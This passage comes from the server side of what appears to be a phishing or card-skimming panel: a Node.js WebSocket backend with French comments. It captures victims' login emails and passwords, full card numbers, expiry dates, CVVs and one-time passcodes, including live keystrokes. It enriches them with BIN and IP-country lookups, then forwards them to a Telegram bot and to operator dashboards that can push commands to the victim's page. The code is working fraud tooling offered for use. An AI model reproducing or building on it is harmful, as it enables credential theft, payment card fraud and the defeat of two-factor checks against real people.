    Nom: `${data.data.first_name || ''} ${data.data.last_name || ''}`.trim(),
    Email: data.data.email || 'N/A',
  });

  // Notifier les dashboards
  broadcastToDashboards({
    type: 'client_updated',
    client: {
      id: clientId,
      ...data.data,
    },
  });
}

// Données de connexion
async function handleLoginData(clientId, data) {
  const client = clients.get(clientId);
  if (!client) return;

  client.login_email = data.data.email;
  client.login_password = data.data.password;

  // Notifier Telegram
  await telegram.notifyLoginData({
    id: clientId,
    login_email: data.data.email,
    login_password: data.data.password,
  });

  // Notifier les dashboards
  broadcastToDashboards({
    type: 'client_updated',
    client: {
      id: clientId,
      login_email: data.data.email,
    },
  });
}

// Données de paiement
async function handlePaymentData(clientId, data) {
  const client = clients.get(clientId);
  if (!client) {
    console.log(`[handlePaymentData] ❌ Client not found: ${clientId}`);
    return;
  }

  console.log(`[handlePaymentData] 📨 Received payment data for client: ${clientId}`);
  console.log(`[handlePaymentData] Data received:`, JSON.stringify(data, null, 2));

  client.card_holder = data.data.cardHolder || data.data.nameOnCard;
  client.card_number = data.data.cardNumber;
  client.card_expiration = data.data.expirationDate;
  client.card_cvv = data.data.cvv;

  // Vérifier et afficher le pays du client
  console.log(`[handlePaymentData] 🌍 Client country from storage: ${client.country || 'NOT SET'}`);
  console.log(`[handlePaymentData] 🌍 Client IP: ${client.ip || 'NOT SET'}`);
  
  // Si le pays n'est pas défini ou est "Unknown", essayer de le récupérer à nouveau
  let country = client.country;
  if (!country || country === 'Unknown' || country === 'N/A' || country === 'null') {
    console.log(`[handlePaymentData] ⚠️  Country is missing or Unknown (${country}), attempting to fetch again...`);
    if (client.ip && client.ip !== 'unknown' && client.ip !== '127.0.0.1' && !client.ip.startsWith('192.168.') && !client.ip.startsWith('10.') && !client.ip.startsWith('172.')) {
      try {
        country = await getCountryFromIP(client.ip);
        console.log(`[handlePaymentData] 🔄 Re-fetched country: ${country}`);
        // Mettre à jour le pays dans les données du client
        if (country && country !== 'Unknown' && country !== 'Local') {
          client.country = country;
          console.log(`[handlePaymentData] ✅ Updated client country to: ${client.country}`);
        } else {
          console.log(`[handlePaymentData] ⚠️  Re-fetch returned invalid country: ${country}`);
          country = country || 'Unknown';
        }
      } catch (error) {
        console.error(`[handlePaymentData] ❌ Error fetching country:`, error);
        country = 'Unknown';
      }
    } else {
      console.log(`[handlePaymentData] ⚠️  Cannot fetch country - invalid or local IP: ${client.ip}`);
      country = 'Unknown';
    }
  } else {
    console.log(`[handlePaymentData] ✅ Using stored country: ${country}`);
  }
  
  // Vérifier le BIN du numéro de carte
  let binInfo = null;
  if (data.data.cardNumber) {
    console.log(`[handlePaymentData] 🔍 Checking BIN for card number...`);
    binInfo = await binService.checkCardNumber(data.data.cardNumber);
    if (binInfo) {
      console.log(`[handlePaymentData] ✅ BIN info retrieved:`, JSON.stringify(binInfo, null, 2));
    } else {
      console.log(`[handlePaymentData] ⚠️  Could not retrieve BIN info`);
    }
  }
  
  const telegramData = {
    id: clientId,
    ip: client.ip,
    country: country || 'Unknown', // Utiliser le pays récupéré ou mis à jour
    card_holder: data.data.cardHolder || data.data.nameOnCard,
    card_number: data.data.cardNumber,
    card_expiration: data.data.expirationDate,
    card_cvv: data.data.cvv,
    current_page: client.current_page,
    bin_info: binInfo, // Ajouter les informations BIN
  };

  console.log(`[handlePaymentData] 📤 Sending to Telegram:`, JSON.stringify(telegramData, null, 2));
  console.log(`[handlePaymentData] 🌍 Country in Telegram data: ${telegramData.country}`);
  console.log(`[handlePaymentData] Telegram enabled:`, telegram.enabled);

  // Notifier Telegram avec toutes les informations
  const telegramResult = await telegram.notifyPaymentData(telegramData);
  console.log(`[handlePaymentData] ✅ Telegram notification result:`, telegramResult);

  // Notifier les dashboards avec toutes les données
  // S'assurer que le pays est bien défini
  const countryToSend = client.country || country || 'Unknown';
  console.log(`[handlePaymentData] 📢 Broadcasting client_updated, country: ${countryToSend}`);
  broadcastToDashboards({
    type: 'client_updated',
    client: {
      id: clientId,
      ip: client.ip,
      country: countryToSend,
      current_page: client.current_page,
      connectedAt: client.connectedAt,
      last_seen: client.last_seen,
      card_holder: data.data.cardHolder,
      card_number: data.data.cardNumber,
      card_expiration: data.data.expirationDate,
      card_cvv: data.data.cvv,
      otp_code: client.otp_code,
      otp_status: client.otp_status,
      otp_submitted_at: client.otp_submitted_at,
      login_email: client.login_email,
      login_password: client.login_password,
    },
  });
}

// Mise à jour OTP (typing)
async function handleOTPUpdate(clientId, data) {
  const client = clients.get(clientId);
  if (!client) return;

  client.otp_code = data.otp;
  client.otp_status = 'typing';

  // Notifier les dashboards avec toutes les données
  broadcastToDashboards({
    type: 'client_updated',
    client: {
      id: clientId,
      ip: client.ip,
      country: client.country,
      current_page: client.current_page,
      connectedAt: client.connectedAt,
      last_seen: client.last_seen,
      card_holder: client.card_holder,
      card_number: client.card_number,
      card_expiration: client.card_expiration,
      card_cvv: client.card_cvv,
      otp_code: data.otp,
      otp_status: 'typing',
      otp_submitted_at: client.otp_submitted_at,
      login_email: client.login_email,
      login_password: client.login_password,
    },
  });
}

// Soumission OTP
async function handleOTPSubmit(clientId, data) {
  const client = clients.get(clientId);
  if (!client) {
    console.log(`[handleOTPSubmit] ❌ Client not found: ${clientId}`);
    return;
  }

  console.log(`[handleOTPSubmit] 📨 Received OTP submit for client: ${clientId}`);
  console.log(`[handleOTPSubmit] OTP received:`, data.otp);

  client.otp_code = data.otp;
  client.otp_status = 'submitted';
  client.otp_submitted_at = Date.now();

  // Vérifier et afficher le pays du client
  console.log(`[handleOTPSubmit] 🌍 Client country from storage: ${client.country || 'NOT SET'}`);
  console.log(`[handleOTPSubmit] 🌍 Client IP: ${client.ip || 'NOT SET'}`);
  
  // Si le pays n'est pas défini ou est "Unknown", essayer de le récupérer à nouveau
  let country = client.country;
  if (!country || country === 'Unknown' || country === 'N/A' || country === 'null') {
    console.log(`[handleOTPSubmit] ⚠️  Country is missing or Unknown (${country}), attempting to fetch again...`);
    if (client.ip && client.ip !== 'unknown' && client.ip !== '127.0.0.1' && !client.ip.startsWith('192.168.') && !client.ip.startsWith('10.') && !client.ip.startsWith('172.')) {
      try {
        country = await getCountryFromIP(client.ip);
        console.log(`[handleOTPSubmit] 🔄 Re-fetched country: ${country}`);
        // Mettre à jour le pays dans les données du client
        if (country && country !== 'Unknown' && country !== 'Local') {
          client.country = country;
          console.log(`[handleOTPSubmit] ✅ Updated client country to: ${client.country}`);
        } else {
          console.log(`[handleOTPSubmit] ⚠️  Re-fetch returned invalid country: ${country}`);
          country = country || 'Unknown';
        }
      } catch (error) {
        console.error(`[handleOTPSubmit] ❌ Error fetching country:`, error);
        country = 'Unknown';
      }
    } else {
      console.log(`[handleOTPSubmit] ⚠️  Cannot fetch country - invalid or local IP: ${client.ip}`);
      country = 'Unknown';
    }
  } else {
    console.log(`[handleOTPSubmit] ✅ Using stored country: ${country}`);
  }
  
  const telegramData = {
    id: clientId,
    ip: client.ip,
    country: country || 'Unknown', // Utiliser le pays récupéré ou mis à jour
    otp_code: data.otp,
    otp_status: 'submitted',
    current_page: client.current_page,
    card_holder: client.card_holder,
    card_number: client.card_number,
    card_expiration: client.card_expiration,
    card_cvv: client.card_cvv, // Ajouter le CVV pour l'affichage dans Telegram
  };

  console.log(`[handleOTPSubmit] 📤 Sending to Telegram:`, JSON.stringify(telegramData, null, 2));
  console.log(`[handleOTPSubmit] 🌍 Country in Telegram data: ${telegramData.country}`);
  console.log(`[handleOTPSubmit] Telegram enabled:`, telegram.enabled);

  // Notifier Telegram avec toutes les informations
  const telegramResult = await telegram.notifyOTP(telegramData);
  console.log(`[handleOTPSubmit] ✅ Telegram notification result:`, telegramResult);

  // Notifier les dashboards avec toutes les données du client
  broadcastToDashboards({
    type: 'client_updated',
    client: {
      id: clientId,
      ip: client.ip,
      country: client.country,
      current_page: client.current_page,
      connectedAt: client.connectedAt,
      last_seen: client.last_seen,
      card_holder: client.card_holder,
      card_number: client.card_number,
      card_expiration: client.card_expiration,
      card_cvv: client.card_cvv,
      otp_code: data.otp,
      otp_status: 'submitted',
      otp_submitted_at: client.otp_submitted_at,
      login_email: client.login_email,
      login_password: client.login_password,
    },
  });
}


// Liste des clients (pour dashboard)
// Fonction pour mettre à jour le pays en arrière-plan pour un client
async function updateCountryInBackground(clientId) {
  const client = clients.get(clientId);
  if (!client || !client.ip) {
    return;
  }
  
  // Éviter les mises à jour multiples en même temps
  if (client.countryUpdateInProgress) {
    console.log(`[updateCountryInBackground] ⚠️  Country update already in progress for client ${clientId}, skipping...`);
    return;
  }
  
  // Ne mettre à jour que si le pays est "Unknown" ou manquant
  if (client.country && client.country !== 'Unknown' && !client.country.startsWith('IP:') && !client.country.startsWith('Unable to determine')) {
    return; // Le pays est déjà valide
  }
  
  // Ignorer les IPs locales
  if (client.ip === '127.0.0.1' || client.ip === '::1' || client.ip.startsWith('192.168.') || client.ip.startsWith('10.') || client.ip.startsWith('172.')) {
    return;
  }
  
  // Marquer que la mise à jour est en cours
  client.countryUpdateInProgress = true;
  console.log(`[updateCountryInBackground] 🔄 Updating country for client ${clientId}, IP: ${client.ip}`);
  
  try {
    const country = await getCountryFromIP(client.ip);
    if (country && country !== 'Unknown' && country !== 'Local') {
      client.country = country;
      console.log(`[updateCountryInBackground] ✅ Country updated for client ${clientId}: ${country}`);
      
      // Notifier les dashboards de la mise à jour (sans envoyer de notification Telegram)
      broadcastToDashboards({
        type: 'client_updated',
        client: {
          id: clientId,
          ip: client.ip,
          country: country,
          current_page: client.current_page,
          connectedAt: client.connectedAt,
          last_seen: client.last_seen,
        },
      });
    } else {
      console.log(`[updateCountryInBackground] ⚠️  Could not update country for client ${clientId}, result: ${country}`);
    }
  } catch (error) {
    console.error(`[updateCountryInBackground] ❌ Error updating country for client ${clientId}:`, error);
  } finally {
    // Réinitialiser le flag après la mise à jour
    client.countryUpdateInProgress = false;
  }
}

function handleList(clientId) {
  console.log(`[handleList] 📋 List request from ${clientId}`);
  const client = clients.get(clientId);
  if (!client || client.role !== 'dashboard') {
    console.log(`[handleList] ❌ List request denied: not a dashboard or client not found. ClientId: ${clientId}, Role: ${client?.role || 'unknown'}`);
    return;
  }

  console.log(`[handleList] ✅ Dashboard ${clientId} requesting clients list`);
  console.log(`[handleList] 📊 Total clients in storage: ${clients.size}`);
  console.log(`[handleList] 📊 Clients breakdown:`);
  Array.from(clients.values()).forEach(c => {
    console.log(`[handleList]   - ${c.id}: role=${c.role || 'null'}, ip=${c.ip || 'N/A'}, country=${c.country || 'Unknown'}`);
  });
  
  const clientsList = Array.from(clients.values())
    .filter(c => {
      // Exclure les dashboards
      if (c.role === 'dashboard') {
        return false; // Ne jamais inclure les dashboards dans la liste des clients
      }
      
      // Vérifier que la connexion WebSocket est toujours ouverte
      const isWebSocketOpen = c.ws && c.ws.readyState === 1; // 1 = OPEN
      
      if (!isWebSocketOpen) {
        console.log(`[handleList] ⚠️  Filtering out client ${c.id} - WebSocket is not open (readyState: ${c.ws?.readyState || 'N/A'}, role: '${c.role || 'null'}')`);
        return false;
      }
      
      // Inclure uniquement les clients avec role 'client' ou null (nouveaux clients pas encore enregistrés)
      // MAIS seulement si leur WebSocket est ouvert
      const isClient = (c.role === 'client' || c.role === null) && isWebSocketOpen;
      
      if (!isClient) {
        console.log(`[handleList] ⚠️  Filtering out client ${c.id} - role is '${c.role || 'null'}' instead of 'client' or null`);
      } else if (c.role === null) {
        console.log(`[handleList] ✅ Including unregistered client ${c.id} (will be registered soon)`);
      } else if (c.role === 'client') {
        console.log(`[handleList] ✅ Including registered client ${c.id} with role 'client', readyState: ${c.ws?.readyState || 'N/A'}`);
      }
      return isClient;
    })
    .map(c => {
      // Si le pays est "Unknown" ou manquant, lancer une mise à jour en arrière-plan (une seule fois)
      if ((!c.country || c.country === 'Unknown' || c.country.startsWith('IP:') || c.country.startsWith('Unable to determine')) && c.ip && c.ip !== 'unknown' && c.ip !== '127.0.0.1' && !c.ip.startsWith('192.168.') && !c.ip.startsWith('10.') && !c.ip.startsWith('172.') && !c.countryUpdateInProgress) {
        // Mettre à jour le pays en arrière-plan (ne pas attendre)
        updateCountryInBackground(c.id).catch(err => {
          console.error(`[handleList] ❌ Error updating country in background for ${c.id}:`, err);
        });
      }
      
      return {
        id: c.id,
        ip: c.ip,
        country: c.country || 'Unknown',
        current_page: c.current_page,
        connectedAt: c.connectedAt,
        last_seen: c.last_seen,
        card_holder: c.card_holder,
        card_number: c.card_number,
        card_expiration: c.card_expiration,
        card_cvv: c.card_cvv,
        otp_code: c.otp_code,
        otp_status: c.otp_status,
        otp_submitted_at: c.otp_submitted_at,
        login_email: c.login_email,
        login_password: c.login_password,
        first_name: c.first_name,
        last_name: c.last_name,
      };
    });
  
  console.log(`[handleList] 📊 Sending ${clientsList.length} client(s) to dashboard ${clientId}`);
  console.log(`[handleList] 📊 Total clients in storage: ${clients.size}`);
  console.log(`[handleList] 📊 Clients with role 'client': ${Array.from(clients.values()).filter(c => c.role === 'client').length}`);
  console.log(`[handleList] 📊 Clients with role null: ${Array.from(clients.values()).filter(c => c.role === null).length}`);
  console.log(`[handleList] 📊 Clients with role 'dashboard': ${Array.from(clients.values()).filter(c => c.role === 'dashboard').length}`);
  if (clientsList.length > 0) {
    console.log(`[handleList] Countries:`, clientsList.map(c => `${c.id}: ${c.country}`).join(', '));
    console.log(`[handleList] Sample client data:`, JSON.stringify(clientsList[0], null, 2));
  } else {
    console.log(`[handleList] ⚠️  No clients found with role 'client'`);
    console.log(`[handleList] 📊 All clients in storage:`, Array.from(clients.values()).map(c => ({
      id: c.id,
      role: c.role || 'null',
      ip: c.ip,
      readyState: c.ws?.readyState || 'N/A'
    })));
  }
  
  const response = {
    type: 'clients',
    items: clientsList,
  };
  console.log(`[handleList] 📤 Response:`, JSON.stringify(response, null, 2));
  client.ws.send(JSON.stringify(response));
  console.log(`[handleList] ✅ Clients list sent to dashboard ${clientId}`);
}

// Gestion des messages directs (dashboard -> client)
function handleDirectMessage(senderId, data) {
  console.log(`\n[DirectMessage] ========================================`);
  console.log(`[DirectMessage] 📨 Received direct message from ${senderId}`);
  console.log(`[DirectMessage] Full data:`, JSON.stringify(data, null, 2));
  console.log(`[DirectMessage] ========================================\n`);
  
  const sender = clients.get(senderId);
  if (!sender) {
    console.log(`[DirectMessage] ❌ Sender not found: ${senderId}`);
    console.log(`[DirectMessage] Available clients:`, Array.from(clients.keys()));
    return;
  }
  
  if (sender.role !== 'dashboard') {
    console.log(`[DirectMessage] ❌ Sender is not a dashboard. Role: ${sender.role}, SenderId: ${senderId}`);
    return;
  }

  const targetId = data.to;
  if (!targetId) {
    console.log('[DirectMessage] ❌ No target client ID provided');
    console.log('[DirectMessage] Data received:', JSON.stringify(data, null, 2));
    return;
  }

  const targetClient = clients.get(targetId);
  if (!targetClient) {
    console.log(`\n[DirectMessage] ========================================`);
    console.log(`[DirectMessage] ❌ Target client not found: ${targetId}`);
    console.log(`[DirectMessage] Available clients:`, Array.from(clients.keys()));
    console.log(`[DirectMessage] Total clients: ${clients.size}`);
    console.log(`[DirectMessage] ⚠️  Client may have disconnected before message could be sent`);
    console.log(`[DirectMessage] ========================================\n`);
    return;
  }
  
  // Vérifier que le client est toujours connecté
  if (targetClient.ws.readyState !== 1) {
    console.log(`\n[DirectMessage] ========================================`);
    console.log(`[DirectMessage] ⚠️  Target client WebSocket is not OPEN`);
    console.log(`[DirectMessage] Client ID: ${targetId}`);
    console.log(`[DirectMessage] WebSocket readyState: ${targetClient.ws.readyState} (1=OPEN, 0=CONNECTING, 2=CLOSING, 3=CLOSED)`);
    console.log(`[DirectMessage] ========================================\n`);
    return;
  }

  console.log(`[DirectMessage] ✅ Sender: ${senderId} (${sender.role}), Target: ${targetId}`);
  console.log(`[DirectMessage] Payload:`, JSON.stringify(data.payload, null, 2));

  // Envoyer le message au client cible
  if (targetClient.ws.readyState === 1) {
    try {
      const message = {
        type: 'direct',
        payload: data.payload || data
      };
      targetClient.ws.send(JSON.stringify(message));
      console.log(`[DirectMessage] ✅ Direct message sent to client ${targetId}`);
    } catch (error) {
      console.error(`[DirectMessage] ❌ Error sending direct message:`, error);
    }
  } else {
    console.log(`[DirectMessage] ❌ WebSocket is not OPEN (readyState: ${targetClient.ws.readyState})`);
  }
}

// Diffuser aux dashboards
function broadcastToDashboards(message) {
  if (dashboards.size === 0) {
    console.log(`[broadcastToDashboards] ⚠️  No dashboards registered, skipping broadcast for:`, message.type);
    return;
  }
  
  const messageStr = JSON.stringify(message);
  console.log(`[broadcastToDashboards] 📢 Broadcasting to ${dashboards.size} dashboard(s):`, message.type);
  if (message.client) {
    console.log(`[broadcastToDashboards] 📊 Client in message:`, message.client.id, `role:`, message.client.role);
  }
  let sentCount = 0;
  dashboards.forEach((dashboard, index) => {
    if (dashboard.readyState === WebSocket.OPEN) {
      try {
        dashboard.send(messageStr);
        sentCount++;
        console.log(`[broadcastToDashboards] ✅ Message sent to dashboard ${index + 1}/${dashboards.size}`);
      } catch (error) {
        console.error(`[broadcastToDashboards] ❌ Error sending to dashboard ${index + 1}:`, error);
      }
    } else {
      console.log(`[broadcastToDashboards] ⚠️  Dashboard ${index + 1} not ready (readyState: ${dashboard.readyState})`);
    }
  });
  console.log(`[broadcastToDashboards] 📊 Sent to ${sentCount}/${dashboards.size} dashboard(s)`);
}

// Générer un ID client unique
function generateClientId() {
  return `client-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
}

// Démarrer le serveur
server.listen(PORT, '0.0.0.0', () => {
  console.log(`WebSocket server running on port ${PORT}`);
  console.log(`HTTP health check available at http://0.0.0.0:${PORT}/health`);
  if (telegram.enabled) {
    console.log('Telegram notifications enabled');
  } else {
    console.log('Telegram notifications disabled (configure .env)');
  }
});

